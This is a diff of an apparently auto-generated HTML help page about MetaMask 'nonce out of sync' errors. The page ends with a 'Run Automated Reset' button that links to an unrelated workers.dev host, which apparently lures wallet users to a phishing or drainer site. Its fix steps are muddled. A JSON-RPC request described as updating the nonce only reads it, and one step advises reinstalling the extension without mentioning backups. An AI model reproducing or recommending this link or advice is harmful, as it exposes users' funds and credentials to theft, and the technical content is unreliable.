@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: -apple-system;
-        background: #0a0c10;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff9455; }
     .btn {
-        background: #cf6679;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,34 +42,35 @@
 <h1>Metamask Nonce Out Of Sync</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error when attempting to send transactions using MetaMask, with a message indicating that the nonce is out of sync, preventing the transaction from being processed.</li>
+<li>Users encounter an error message indicating that their MetaMask nonce is out of sync, preventing them from completing transactions on the Ethereum (ETH) network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a mismatch between the expected transaction nonce stored in MetaMask and the actual nonce on the Ethereum blockchain, often resulting from concurrent transactions or network delays.</li>
+<li>The error occurs when the nonce (a counter tracking the number of transactions sent from an address) stored in MetaMask does not match the nonce on the ETH blockchain, often due to a failed or pending transaction.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset the account in MetaMask to resynchronize the nonce.</li>
-<li>Update MetaMask to the latest version to ensure compatibility with the current Ethereum network state.</li>
-<li>Use the following command to manually adjust the nonce:</li>
+<li>Reset the account in MetaMask to resync the nonce:</li>
+<li>Delete the MetaMask extension and reinstall it</li>
+<li>Use the <code>eth_getTransactionCount</code> RPC method to retrieve the current nonce</li>
+<li>Update the nonce manually using the following JSON RPC request:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>eth_sendTransaction<span class="w"> </span><span class="o">{</span><span class="w"> </span>
-<span class="w">  </span><span class="s2">&quot;from&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...your_address...&quot;</span>,<span class="w"> </span>
-<span class="w">  </span><span class="s2">&quot;nonce&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...adjusted_nonce...&quot;</span>,<span class="w"> </span>
-<span class="w">  </span><span class="s2">&quot;gas&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...&quot;</span>,<span class="w"> </span>
-<span class="w">  </span><span class="s2">&quot;gasPrice&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...&quot;</span><span class="w"> </span>
-<span class="o">}</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_getTransactionCount&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;0x742d35Cc6634C0532925a3b844Bc454e4438f44e&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;latest&quot;</span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider using an external console for more advanced transaction management.</p>
+<p>Consider accessing the Ethereum network through an external console for more advanced troubleshooting and direct RPC access.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>MetaMask installed and configured</li>
-<li>Ethereum account with sufficient balance</li>
-<li>Access to the Ethereum network via a node or provider</li>
+<li>Basic understanding of Ethereum and MetaMask</li>
+<li>Access to the MetaMask extension</li>
+<li>Familiarity with JSON RPC requests and Ethereum network tools</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
